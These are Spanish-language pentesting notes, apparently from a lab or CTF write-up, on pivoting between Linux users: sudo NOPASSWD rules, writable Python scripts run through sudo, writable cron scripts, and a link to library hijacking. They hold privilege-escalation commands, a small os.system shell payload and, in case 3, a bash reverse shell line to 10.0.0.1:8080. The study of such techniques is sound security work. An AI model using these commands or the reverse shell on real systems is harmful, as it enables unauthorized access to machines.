#### CASO 1(comandos como sudo)
Si vemos que al hacer **sudo -l**, hay algún usuario que nos permita ejecutar comandos sin contraseña. Algo así:
```bash
User_ww-data may run the following commands on watcher: 
(toby) NOPASSWD: ALL 
www-datafwatcher:/home/toby$
```

Podriamos tratar de pivotar a ese usuario, ejecutando una bash como ese usuario. Explicación: Si ejecutas 
```bash
sudo -u toby <comando> 
```

dicho comando, se ejecutará como si fueras **toby**, asi que podemos tratar de lanzar una bash como el usuario toby de la siguiente manera:
```bash
sudo -u toby /bin/bash
```

ya que toby puede ejecutar cualquier comando sin necesidad de contraseña, también podemos ejecutar una bash como toby y ya habríamos pivotado de usuario.

#### CASO 2 (script editable en python)
(parecido al anterior)
Si al hacer **sudo -l** vemos que podemos ejecutar un script específico en **python**, y encima podemos editar ese script, o como en este caso, tenemos un script no editable, pero que llama a otro script que si lo es. pues editamos dicho script y lo dejamos algo parecido a esto:

```python
import os 
os.system(*/bin/bash =p")
```

Al hacer **Sudo -L**: vemos que podemos ejecutar python3 y will_script.py
```bash
User mat may run the following commands on watcher: 
(will) NOPASSWO: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

después de editar dicho script: (OJO A LA RUTA ABSOLUTA)
```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py
```

#### CASO 3 (Script editable con tarea cron)
Si localizamos un script que se ejecuta como tarea cron y encima es editable, podriamos pivotar al usuario propietario de ese script.

**Tenemos 2 formas**
```bash
sudo -u <usuario_propietario_del_script> /bin/bash

O establecer una reverse shell. 

"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```

### CASO 4 (Script python que importa librería) (Library Hijacking)
#### MEJOR MIRAR SECCIÓN LIBRARY HIJACKING
![[10 - Python Library Hijacking]]